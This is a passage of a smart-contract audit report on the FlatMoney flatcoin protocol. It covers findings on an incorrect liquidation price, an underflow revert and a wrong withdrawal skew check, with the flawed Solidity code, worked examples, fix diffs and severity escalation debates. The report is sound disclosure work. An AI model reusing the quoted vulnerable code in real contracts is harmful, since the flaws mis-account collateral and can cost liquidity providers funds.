Compared to SNX V2, it is not vulnerable to this issue. The reason is that in SNX V2 when it computes the PnL, it does not "scale" down the result by the price. The PnL in SNXv2 is simply computed in dollar value ($positionSize \times priceShift$), while FlatCoin protocol computes in collateral (rETH) term ($\frac{positionSize \times priceShift}{price}$).

https://github.com/Synthetixio/synthetix/blob/1cfafd30deb4511cf885b4bc3cc4e9c970356800/contracts/PerpsV2MarketBase.sol#L261

```solidity
function _profitLoss(Position memory position, uint price) internal pure returns (int pnl) {
    int priceShift = int(price).sub(int(position.lastPrice));
    return int(position.size).multiplyDecimal(priceShift);
}
```

https://github.com/Synthetixio/synthetix/blob/1cfafd30deb4511cf885b4bc3cc4e9c970356800/contracts/PerpsV2MarketBase.sol#L278

```solidity
/*
 * The initial margin of a position, plus any PnL and funding it has accrued. The resulting value may be negative.
 */
function _marginPlusProfitFunding(Position memory position, uint price) internal view returns (int) {
    int funding = _accruedFunding(position, price);
    return int(position.margin).add(_profitLoss(position, price)).add(funding);
}
```



## Discussion

**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266.

# Issue H-7: Incorrect price used when updating the global position data 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/188 

## Found by 
0xLogos, 0xVolodya, juan, nobody2018, santipu\_, xiaoming90
## Summary

Incorrect price used when updating the global position data leading to a loss of assets for LPs.

## Vulnerability Detail

Near the end of the liquidation process, the `updateGlobalPositionData` function at Line 159 will be executed to update the global position data. However, when executing the `updateGlobalPositionData` function, the code sets the price at Line 160 below to the position's last price (`position.lastPrice`), which is incorrect. The price should be set to the current price instead, and not the position's last price.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L160

```solidity
File: LiquidationModule.sol
082:     /// @notice Function to liquidate a position.
083:     /// @dev One could directly call this method instead of `liquidate(uint256, bytes[])` if they don't want to update the Pyth price.
084:     /// @param tokenId The token ID of the leverage position.
085:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
086:         FlatcoinStructs.Position memory position = vault.getPosition(tokenId);
087: 
088:         (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();
089: 
090:         // Settle funding fees accrued till now.
091:         vault.settleFundingFees();
092: 
093:         // Check if the position can indeed be liquidated.
094:         if (!canLiquidate(tokenId)) revert FlatcoinErrors.CannotLiquidate(tokenId);
095: 
096:         FlatcoinStructs.PositionSummary memory positionSummary = PerpMath._getPositionSummary(
097:             position,
098:             vault.cumulativeFundingRate(),
099:             currentPrice
100:         );
..SNIP..
159:         vault.updateGlobalPositionData({
160:             price: position.lastPrice,
161:             marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
162:             additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.
163:         });
```

The reason why the `updateGlobalPositionData` function expects a current price to be passed in is that within the `PerpMath._profitLossTotal` function, it will compute the price shift between the current price and the last price to obtain the PnL of all the open positions. Also, per the comment at Line 170 below, it expects the current price of the collateral to be passed in.

Thus, it is incorrect to pass in the individual position's last/entry price, which is usually the price of the collateral when the position was first opened or adjusted some time ago.

Thus, if the last/entry price of the liquidated position is higher than the current price of collateral, the PnL will be inflated, indicating more gain for the long traders. Since this is a zero-sum game, this also means that the LP loses more assets than expected due to the inflated gain of the long traders.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

```solidity
File: FlatcoinVault.sol
168:     /// @notice Function to update the global position data.
169:     /// @dev This function is only callable by the authorized modules.
170:     /// @param _price The current price of the underlying asset.
171:     /// @param _marginDelta The change in the margin deposited total.
172:     /// @param _additionalSizeDelta The change in the size opened total.
173:     function updateGlobalPositionData(
174:         uint256 _price,
175:         int256 _marginDelta,
176:         int256 _additionalSizeDelta
177:     ) external onlyAuthorizedModule {
178:         // Get the total profit loss and update the margin deposited total.
179:         int256 profitLossTotal = PerpMath._profitLossTotal({globalPosition: _globalPositions, price: _price});
180: 
181:         // Note that technically, even the funding fees should be accounted for when computing the margin deposited total.
182:         // However, since the funding fees are settled at the same time as the global position data is updated,
183:         // we can ignore the funding fees here.
184:         int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;
185: 
186:         // Check that the sum of margin of all the leverage traders is not negative.
187:         // Rounding errors shouldn't result in a negative margin deposited total given that
188:         // we are rounding down the profit loss of the position.
189:         // If anything, after closing the last position in the system, the `marginDepositedTotal` should can be positive.
190:         // The margin may be negative if liquidations are not happening in a timely manner.
191:         if (newMarginDepositedTotal < 0) {
192:             revert FlatcoinErrors.InsufficientGlobalMargin();
193:         }
194: 
195:         _globalPositions = FlatcoinStructs.GlobalPositions({
196:             marginDepositedTotal: uint256(newMarginDepositedTotal),
197:             sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
198:             lastPrice: _price
199:         });
```

## Impact

Loss of assets for the LP as mentioned in the above section.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L160

## Tool used

Manual Review

## Recommendation

Use the current price instead of liquidated position's last price when update the global position data

```diff
(uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();
..SNIP..
vault.updateGlobalPositionData({
-    price: position.lastPrice,
+    price: currentPrice,    
    marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
    additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.
});
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(1)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/264.

# Issue H-8: Liquidation will result in an underflow revert 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/192 

## Found by 
xiaoming90
## Summary

Liquidation will result in an underflow revert. Liquidation is the core component of the protocol and is important to the solvency of the protocol. If the liquidation cannot be executed due to the revert described in the above scenario, underwater positions and bad debt will accumulate in the protocol, threatening the solvency of the protocol.

In addition, the proper function of the protocol relies on the correct accounting of the collateral in the vault and collateral owned by long traders and LPs. If the accounting is off, the vault will be broken.

## Vulnerability Detail

At $T0$, the current price of ETH is \$1000 and assume the following state:

| Alice's Long Position 1                                     | Bob's Long Position 2                                       | Charles (LP)     |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------------- |
| Position Size = 6 ETH<br />Margin = 3 ETH<br />Last Price (entry price) = \$1000 | Position Size = 6 ETH<br />Margin = 5 ETH<br />Last Price (entry price) = \$1000 | Deposited 12 ETH |

- The `stableCollateralTotal` will be 12 ETH
- The `GlobalPositions.marginDepositedTotal` will be 8 ETH (3 + 5)
- The `globalPosition.sizeOpenedTotal` will be 12 ETH (6 + 6)
- The total balance of ETH in the vault is 20 ETH. 

As this is a perfectly hedged market, the accrued fee will be zero, and ignored in this report for simplicity's sake.

At $T1$, the price of the ETH drops from \$1000 to \$600. At this point, the settle margin of both long positions will be as follows:

| Alice's Long Position 1                                     | Bob's Long Position 2                                       |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| priceShift = Current Price - Last Price = \$600 - \$1000 = -\$400<br />PnL = (Position Size * priceShift) / Current Price = (6 ETH * -\$400) / \$400 = -4 ETH<br />settleMargin = marginDeposited + PnL = 3 ETH + (-4 ETH) = -1 ETH | PnL = -4 ETH (Same calculation)<br />settleMargin = marginDeposited + PnL = 5 ETH + (-4 ETH) = 1 ETH |

Alice's long position is underwater (settleMargin < 0), so it can be liquidated. 

Since the liquidated position's settledMargin is less than 0, the code at Line 142 below will be executed.

```solidity
vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal((3 ETH + (-4 ETH)) - (-4 ETH)); // This effectively remove the PnL component from the equation
vault.updateStableCollateralTotal(3 ETH);
```

After the `updateStableCollateralTotal` function is executed, the `stableCollateralTotal` will become 15 ETH (12 + 3), the `GlobalPositions.marginDepositedTotal` will remain at 8 ETH, and the total balance of ETH in the vault will remain at 20 ETH.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

```solidity
File: LiquidationModule.sol
085:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
..SNIP..
109:         if (settledMargin > 0) {
..SNIP..
138:         } else {
139:             // If the settled margin is -ve then the LPs have to bear the cost.
140:             // Adjust the stable collateral total to account for user's profit/loss and the negative margin.
141:             // Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).
142:             vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
143:         }
..SNIP..
159:         vault.updateGlobalPositionData({
160:             price: position.lastPrice,
161:             marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
162:             additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.
163:         });
```

Subsequently, the `vault.updateGlobalPositionData` will be executed. The `marginDelta` will be set to -3 ETH, as shown below:

```solidity
marginDelta = -(position.marginDeposited + positionSummary.accruedFunding)
marginDelta = -(3 ETH + 0)
marginDelta = -3 ETH
```

Line 179 below within the `updateGlobalPositionData` function will compute the total PnL of all the opened long positions.

```solidity
priceShift = current price - last price
priceShift = $600 - $1000 = -$400

profitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / current price
profitLossTotal = (12 ETH * -$400) / $600
profitLossTotal = -8 ETH
```

At Line 184 below, the `newMarginDepositedTotal` will be set to as follows:

```solidity
newMarginDepositedTotal = _globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal
newMarginDepositedTotal = 8 ETH + (-3 ETH) + (-8 ETH) = -3 ETH
```

As `newMarginDepositedTotal` is less than zero, the code at Line 192 will trigger a revert, causing the liquidation TX to revert.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

```solidity
File: FlatcoinVault.sol
168:     /// @notice Function to update the global position data.
169:     /// @dev This function is only callable by the authorized modules.
170:     /// @param _price The current price of the underlying asset.
171:     /// @param _marginDelta The change in the margin deposited total.
172:     /// @param _additionalSizeDelta The change in the size opened total.
173:     function updateGlobalPositionData(
174:         uint256 _price,
175:         int256 _marginDelta,
176:         int256 _additionalSizeDelta
177:     ) external onlyAuthorizedModule {
178:         // Get the total profit loss and update the margin deposited total.
179:         int256 profitLossTotal = PerpMath._profitLossTotal({globalPosition: _globalPositions, price: _price});
180: 
181:         // Note that technically, even the funding fees should be accounted for when computing the margin deposited total.
182:         // However, since the funding fees are settled at the same time as the global position data is updated,
183:         // we can ignore the funding fees here.
184:         int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;
185: 
186:         // Check that the sum of margin of all the leverage traders is not negative.
187:         // Rounding errors shouldn't result in a negative margin deposited total given that
188:         // we are rounding down the profit loss of the position.
189:         // If anything, after closing the last position in the system, the `marginDepositedTotal` should can be positive.
190:         // The margin may be negative if liquidations are not happening in a timely manner.
191:         if (newMarginDepositedTotal < 0) {
192:             revert FlatcoinErrors.InsufficientGlobalMargin();
193:         }
194: 
195:         _globalPositions = FlatcoinStructs.GlobalPositions({
196:             marginDepositedTotal: uint256(newMarginDepositedTotal),
197:             sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
198:             lastPrice: _price
199:         });
200: 
201:         // Profit loss of leverage traders has to be accounted for by adjusting the stable collateral total.
202:         // Note that technically, even the funding fees should be accounted for when computing the stable collateral total.
203:         // However, since the funding fees are settled at the same time as the global position data is updated,
204:         // we can ignore the funding fees here
205:         _updateStableCollateralTotal(-profitLossTotal);
206:     }
```

Let's assume that there is no revert for the sake of verifying the correctness of the accounting used in the later portion of the code within the liquidation function.

In this case, the latest `marginDepositedTotal` will be set to -3 ETH. 

Next, the `_updateStableCollateralTotal(-profitLossTotal);` at Line 205 above will be executed, and the `stableCollateralTotal` will be set to 23 ETH.

```solidity
stableCollateralTotal = stableCollateralTotal + (-profitLossTotal)
stableCollateralTotal = 15 ETH + (-(-8 ETH))
stableCollateralTotal = 15 ETH + (8 ETH)
stableCollateralTotal = 23 ETH
```

This shows that accounting is incorrect, as it is not possible for the LPs to own 23 ETH when there are only 20 ETH balance as collateral in the vault.

In conclusion, there are two (2) issues identified here:

1. Liquidation cannot be carried out due to revert
2. Even if there is no revert, the accounting of collateral is off.

## Impact

Liquidation is the core component of the protocol and is important to the solvency of the protocol. If the liquidation cannot be executed due to the revert described in the above scenario, underwater positions and bad debt will accumulate in the protocol, threatening the solvency of the protocol.

In addition, the proper function of the protocol relies on the correct accounting of the collateral in the vault and collateral owned by long traders and LPs. If the accounting is off, the vault will be broken.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

## Tool used

Manual Review

## Recommendation

In the above scenario, to prevent an underflow revert when computing the new `newMarginDepositedTotal` and fixing the incorrect balance issue, the `profitLossTotal` should be excluded within the `updateGlobalPositionData` function during liquidation. 

```diff
- profitLossTotal = PerpMath._profitLossTotal(...)

- newMarginDepositedTotal = globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal
+ newMarginDepositedTotal = globalPositions.marginDepositedTotal + _marginDelta

if (newMarginDepositedTotal < 0) {
    revert FlatcoinErrors.InsufficientGlobalMargin();
}

_globalPositions = FlatcoinStructs.GlobalPositions({
    marginDepositedTotal: uint256(newMarginDepositedTotal),
    sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
    lastPrice: _price
});
        
- _updateStableCollateralTotal(-profitLossTotal);
```

The existing `updateGlobalPositionData` function still needs to be used for other functions besides liquidation. As such, consider creating a separate new function (e.g., updateGlobalPositionDataDuringLiquidation) solely for use during the liquidation that includes the above fixes.

**Verification of solution**

Let's verify if the fixes work as intended using the same example in the report.

The following means that the Initial Deposited Margin (3 ETH) of Alice's position is being transferred to the LPs.

```solidity
vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal((3 ETH + (-4 ETH)) - (-4 ETH)); // This effectively remove the PnL component from the equation
vault.updateStableCollateralTotal(3 ETH);
```

After the `updateStableCollateralTotal` function is executed, the `stableCollateralTotal` will become 15 ETH (12 + 3), the `GlobalPositions.marginDepositedTotal` will remain at 8 ETH, and the total balance of ETH in the vault will remain at 20 ETH.

The same values as the earlier example, except that the formula has changed. The `newMarginDepositedTotal` is left with 5 ETH, which is correct because this represents the ETH margin deposited by Bob's existing position in the system.

```solidity
newMarginDepositedTotal = _globalPositions.marginDepositedTotal + _marginDelta
newMarginDepositedTotal = 8 ETH + (-3 ETH) = 5 ETH
```

The `newMarginDepositedTotal` is above 0, so there is no revert, which is good.

```solidity
stableCollateralTotal = stableCollateralTotal + 0
stableCollateralTotal = 15 ETH (No change, remain the same)
```

In the end, `newMarginDepositedTotal` is 5 ETH and `stableCollateralTotal` is 15 ETH. There are 20 ETH balance as collateral in the vault.

```solidity
(newMarginDepositedTotal + stableCollateralTotal) == (20 ETH balance as collateral in the vault)
```

Thus, they are in sync now. Also, there is no revert or underflow error.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(5)



**itsermin**

This has been resolved in issue #186 fix.
Test scenario added here: https://github.com/dhedge/flatcoin-v1/pull/266/commits/3a95a5b932fb9dcd770afd589751ecfd151360a8

**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266.

**santipu03**

Escalate

This issue is actually a duplicate of #180. 

Issue #180 describes the vulnerability in a generalized way. The impact may be different but the root cause is the same: an incorrect handling of PnL during liquidation. Also, the fix is the same so this issue should be duplicate of #180. 

**sherlock-admin2**

> Escalate
> 
> This issue is actually a duplicate of #180. 
> 
> Issue #180 describes the vulnerability in a generalized way. The impact may be different but the root cause is the same: an incorrect handling of PnL during liquidation. Also, the fix is the same so this issue should be duplicate of #180. 

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**Czar102**

Would like @nevillehuang to double check.

Planning to accept the escalation and duplicate this with #180.

**nevillehuang**

> Would like @nevillehuang to double check.
> 
> Planning to accept the escalation and duplicate this with #180.

Agree, should be duplicates, both issues arises due to the incorrect handling of `profitLossTotal` causing different impacts

**Czar102**

Result:
High
Duplicate of #180


**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [santipu03](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/192/#issuecomment-1956262089): accepted

# Issue H-9: Incorrect skew check formula used during withdrawal 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/193 

## Found by 
Bony, dany.armstrong90, deepplus, ni8mare, xiaoming90
## Summary

The purpose of the long max skew (`skewFractionMax`) is to prevent the FlatCoin holders from being increasingly short. However, the existing controls are not adequate, resulting in the long skew exceeding the long max skew deemed acceptable by the protocol, as shown in the example in this report. 

When the  FlatCoin holders are overly net short, an increase in the collateral price (rETH) leads to a more pronounced decrease in the price of UNIT, amplifying the risk and loss of the FlatCoin holders and increasing the risk of UNIT's price going to 0.

## Vulnerability Detail

When the users withdraw their collateral (rETH) from the system, the skew check (`checkSkewMax()`) at Line 132 will be executed to ensure that the withdrawal does not cause the system to be too skewed towards longs and the skew is still within the `skewFractionMax`.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L132

```solidity
File: DelayedOrder.sol
109:     function announceStableWithdraw(
110:         uint256 withdrawAmount,
111:         uint256 minAmountOut,
112:         uint256 keeperFee
113:     ) external whenNotPaused {
114:         uint64 executableAtTime = _prepareAnnouncementOrder(keeperFee);
115: 
116:         IStableModule stableModule = IStableModule(vault.moduleAddress(FlatcoinModuleKeys._STABLE_MODULE_KEY));
117:         uint256 lpBalance = IERC20Upgradeable(stableModule).balanceOf(msg.sender);
118: 
119:         if (lpBalance < withdrawAmount)
120:             revert FlatcoinErrors.NotEnoughBalanceForWithdraw(msg.sender, lpBalance, withdrawAmount);
121: 
122:         // Check that the requested minAmountOut is feasible
123:         {
124:             uint256 expectedAmountOut = stableModule.stableWithdrawQuote(withdrawAmount);
125: 
126:             if (keeperFee > expectedAmountOut) revert FlatcoinErrors.WithdrawalTooSmall(expectedAmountOut, keeperFee);
127: 
128:             expectedAmountOut -= keeperFee;
129: 
130:             if (expectedAmountOut < minAmountOut) revert FlatcoinErrors.HighSlippage(expectedAmountOut, minAmountOut);
131: 
132:             vault.checkSkewMax({additionalSkew: expectedAmountOut});
133:         }
```

However, using the `checkSkewMax` function for checking skew when LPs/stakers withdraw collateral from the system is incorrect. The `checkSkewMax` function is specifically used when there is a change in position size on the long-trader side.

In Line 303 below, the numerator of the formula holds the collateral/margin size of the long traders, while the denominator of the formula holds the collateral size of the LPs. When the LP withdraws collateral from the system, it should be deducted from the denominator. Thus, the formula is incorrect to be used in this scenario.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L303

```solidity
File: FlatcoinVault.sol
294:     /// @notice Asserts that the system will not be too skewed towards longs after additional skew is added (position change).
295:     /// @param _additionalSkew The additional skew added by either opening a long or closing an LP position.
296:     function checkSkewMax(uint256 _additionalSkew) public view {
297:         // check that skew is not essentially disabled
298:         if (skewFractionMax < type(uint256).max) {
299:             uint256 sizeOpenedTotal = _globalPositions.sizeOpenedTotal;
300: 
301:             if (stableCollateralTotal == 0) revert FlatcoinErrors.ZeroValue("stableCollateralTotal");
302: 
303:             uint256 longSkewFraction = ((sizeOpenedTotal + _additionalSkew) * 1e18) / stableCollateralTotal;
304: 
305:             if (longSkewFraction > skewFractionMax) revert FlatcoinErrors.MaxSkewReached(longSkewFraction);
306:         }
307:     }
```

Let's make a comparison between the current formula and the expected (correct) formula to determine if there is any difference:

Let `sizeOpenedTotal` be $SO_{total}$, `stableCollateralTotal` be $SC_{total}$ and `_additionalSkew` be $AS$. Assume that the `sizeOpenedTotal` is 100 ETH and `stableCollateralTotal` is 100 ETH. Thus, the current `longSkewFraction` is zero as both the long and short sizes are the same.

Assume that someone intends to withdraw 20 ETH collateral from the system. Thus, the `_additionalSkew` will be 20 ETH.

**Current Formula**

$$
\begin{align} 
skewFrac = \frac{SO_{total} + AS}{SC_{total}} \\
skewFrac = \frac{100 + 20}{100} = 1.2
\end{align}
$$

**Expected (correct) formula**

$$
\begin{align} 
skewFrac = \frac{SO_{total}}{SC_{total} - AS} \\
skewFrac = \frac{100}{100 - 20} = 1.25
\end{align}
$$

Assume the `skewFractionMax` is 1.20 within the protocol.

The first formula will indicate that the long skew after the withdrawal will not exceed the long max skew, and thus, the withdrawal will proceed to be executed. Immediately after the execution is completed, the system exceeds the `skewFractionMax` of 1.2 as the current long skew has become 1.25.

## Impact

The purpose of the long max skew (`skewFractionMax`) is to prevent the FlatCoin holders from being increasingly short. However, the existing controls are not adequate, resulting in the long skew exceeding the long max skew deemed acceptable by the protocol, as shown in the example above. 

When the FlatCoin holders are overly net short, an increase in the collateral price (rETH) leads to a more pronounced decrease in the price of UNIT, amplifying the risk and loss of the FlatCoin holders and increasing the risk of UNIT's price going to 0.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L303

## Tool used

Manual Review

## Recommendation

The `checkSkewMax` function is designed specifically for long trader's operations such as open, adjust, and close positions. They cannot be used interchangeably with the LP's operations, such as depositing and withdrawing stable collateral.

Consider implementing a new function that uses the following for calculating the long skew after withdrawal:

$$
skewFrac = \frac{SO_{total}}{SC_{total} - AS}
$$

Let `sizeOpenedTotal` be $SO_{total}$, `stableCollateralTotal` be $SC_{total}$ and `_additionalSkew` be $AS$. 



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: medium(7)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/280.

**santipu03**

Escalate

The impact should be QA.

While I agree that when announcing a withdrawal of collateral the skew is not correctly checked, the order won't execute if the skew is too high due to this check [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L130)

Therefore, the skew won't be higher than the max allowed skew.

**sherlock-admin2**

> Escalate
> 
> The impact should be QA.
> 
> While I agree that when announcing a withdrawal of collateral the skew is not correctly checked, the order won't execute if the skew is too high due to this check [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L130)
> 
> Therefore, the skew won't be higher than the max allowed skew.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**NishithPat**

Escalate

Even if the order may not execute due to this check - `vault.checkSkewMax({additionalSkew: 0})`, the fact that it allows the user to call `announceWithdraw` in this manner is still an issue.

Consider the same example in the above issue where a user tries to withdraw 20 ETH. Using the current formula `announceWithdraw` would execute because the `longSkewFraction` is not greater than 1.2 (`skewFractionMax`). When it is time for its execution using the `executeWithdraw` function, it might revert due to this check - `vault.checkSkewMax({additionalSkew: 0})`.

The user notices that his withdrawal does not get executed. So, he decides to withdraw lower amounts for the execution to take place. 

In order to do this he needs to do the additional step of cancelling the previous `announceWithdraw` first using `cancelExistingOrder` and then call `announceWithdraw` with a lower amount. Or, even if he does not call `cancelExistingOrder` first, and uses `announceWithdraw` directly, it would call the `_prepareAnnouncementOrder` function which would anyway call the `cancelExistingOrder` function. So, this means that the user has to pay additional gas to do this. 

```solidity
function _prepareAnnouncementOrder(uint256 keeperFee) internal returns (uint64 executableAtTime) {
        // Settle funding fees to not encounter the `MaxSkewReached` error.
        // This error could happen if the funding fees are not settled for a long time and the market is skewed long
        // for a long time.
        vault.settleFundingFees();

        if (keeperFee < IKeeperFee(vault.moduleAddress(FlatcoinModuleKeys._KEEPER_FEE_MODULE_KEY)).getKeeperFee())
            revert FlatcoinErrors.InvalidFee(keeperFee);

        // If the user has an existing pending order that expired, then cancel it.
        cancelExistingOrder(msg.sender);

        executableAtTime = uint64(block.timestamp + vault.minExecutabilityAge());
    }
 ```
 
Another important point to note is that a user will be able to call `announceWithdraw` only after `order.executableAtTime + vault.maxExecutabilityAge()` amount of time has passed because `cancelExistingOrder` has this check -
 
 ```solidity
 if (block.timestamp <= order.executableAtTime + vault.maxExecutabilityAge())
            revert FlatcoinErrors.OrderHasNotExpired();
```

So, this means that not only does a user have to spend additional gas to cancel the original `announceWithdraw` request, but he also needs to wait until he can send a new withdrawal transaction as he cannot withdraw whenever he wants based on what’s written above. The old order needs to expire first.

This might not seem much for a single user, but many users can face the same issue. They would also have to spend more gas and time to execute withdrawals. This combined effect cannot be ignored. This would make for a terrible UX. 

I mean all these extra steps could be easily avoided if the protocol chooses to use the right formula for `announceWithdraw` as well. The first transaction for `announceWithdraw` would not have been executed in the first place, had the right formula been used.

`checkSkewMax` function is a core invariant of the system. Its implementation cannot be inconsistent. It cannot be different in `announceWithdraw` and `executeWithdraw.`

The impact may not seem high, but it is not QA.

**sherlock-admin2**

> Escalate
> 
> Even if the order may not execute due to this check - `vault.checkSkewMax({additionalSkew: 0})`, the fact that it allows the user to call `announceWithdraw` in this manner is still an issue.
> 
> Consider the same example in the above issue where a user tries to withdraw 20 ETH. Using the current formula `announceWithdraw` would execute because the `longSkewFraction` is not greater than 1.2 (`skewFractionMax`). When it is time for its execution using the `executeWithdraw` function, it might revert due to this check - `vault.checkSkewMax({additionalSkew: 0})`.
> 
> The user notices that his withdrawal does not get executed. So, he decides to withdraw lower amounts for the execution to take place. 
> 
> In order to do this he needs to do the additional step of cancelling the previous `announceWithdraw` first using `cancelExistingOrder` and then call `announceWithdraw` with a lower amount. Or, even if he does not call `cancelExistingOrder` first, and uses `announceWithdraw` directly, it would call the `_prepareAnnouncementOrder` function which would anyway call the `cancelExistingOrder` function. So, this means that the user has to pay additional gas to do this. 
> 
> ```solidity
> function _prepareAnnouncementOrder(uint256 keeperFee) internal returns (uint64 executableAtTime) {
>         // Settle funding fees to not encounter the `MaxSkewReached` error.
>         // This error could happen if the funding fees are not settled for a long time and the market is skewed long
>         // for a long time.
>         vault.settleFundingFees();
> 
>         if (keeperFee < IKeeperFee(vault.moduleAddress(FlatcoinModuleKeys._KEEPER_FEE_MODULE_KEY)).getKeeperFee())
>             revert FlatcoinErrors.InvalidFee(keeperFee);
> 
>         // If the user has an existing pending order that expired, then cancel it.
>         cancelExistingOrder(msg.sender);
> 
>         executableAtTime = uint64(block.timestamp + vault.minExecutabilityAge());
>     }
>  ```
>  
> Another important point to note is that a user will be able to call `announceWithdraw` only after `order.executableAtTime + vault.maxExecutabilityAge()` amount of time has passed because `cancelExistingOrder` has this check -
>  
>  ```solidity
>  if (block.timestamp <= order.executableAtTime + vault.maxExecutabilityAge())
>             revert FlatcoinErrors.OrderHasNotExpired();
> ```
> 
> So, this means that not only does a user have to spend additional gas to cancel the original `announceWithdraw` request, but he also needs to wait until he can send a new withdrawal transaction as he cannot withdraw whenever he wants based on what’s written above. The old order needs to expire first.
> 
> This might not seem much for a single user, but many users can face the same issue. They would also have to spend more gas and time to execute withdrawals. This combined effect cannot be ignored. This would make for a terrible UX. 
> 
> I mean all these extra steps could be easily avoided if the protocol chooses to use the right formula for `announceWithdraw` as well. The first transaction for `announceWithdraw` would not have been executed in the first place, had the right formula been used.
> 
> `checkSkewMax` function is a core invariant of the system. Its implementation cannot be inconsistent. It cannot be different in `announceWithdraw` and `executeWithdraw.`
> 
> The impact may not seem high, but it is not QA.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**ydspa**

> Escalate
> 
> The impact should be QA.
> 
> While I agree that when announcing a withdrawal of collateral the skew is not correctly checked, the order won't execute if the skew is too high due to this check [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L130)
> 
> Therefore, the skew won't be higher than the max allowed skew.

Good catch, i also find this issue during audit, but i finally decide not to submit it due to this check. As the impact only limits to user's gas waste, and the occurrence possibility is very low. Therefore, it's a valid low issue.

**santipu03**

@NishithPat 

The overall probability of this happening could be considered as medium/low. Regarding the impact, in the worst case the user would have to wait one minute more to withdraw the collateral and waste a little bit of gas (cheap on Base chain). 

Probability being medium/low and impact being low results on the overall severity being QA. 

**NishithPat**

But, you can't deny the fact that a user has to do all these extra steps just to withdraw some amount again. This is a waste of his resources. And as I said, when you look at just 1 user it might not look as much, but multiple users will face the same issue. They will also be wasting their resources. So, when looked at as a whole (keeping multiple users in mind), the resources being used just to execute these transactions again would add up. 

All this could have been easily prevented, had the protocol used the right formula in `announceWithdraw` as well. The initial incorrect transaction for `announceWithdraw` would have never been executed if the right formula had been used.

The issue's severity is at least a medium. Such a violation of a core invariant of the system cannot be QA.

**0xLogos**

Agree with the first escalation

low, there's correct check in stable withdraw execution. After doing some math, you'll see that the correct check is more strict, so the announce function won't revert falsely.

**NishithPat**

@0xLogos 

`announceWithdraw` function would have rightly reverted if they had used the right formula. LongSkew would have been 1.25, which would be greater than 1.2 (max allowed skew), based on the example in the above issue.

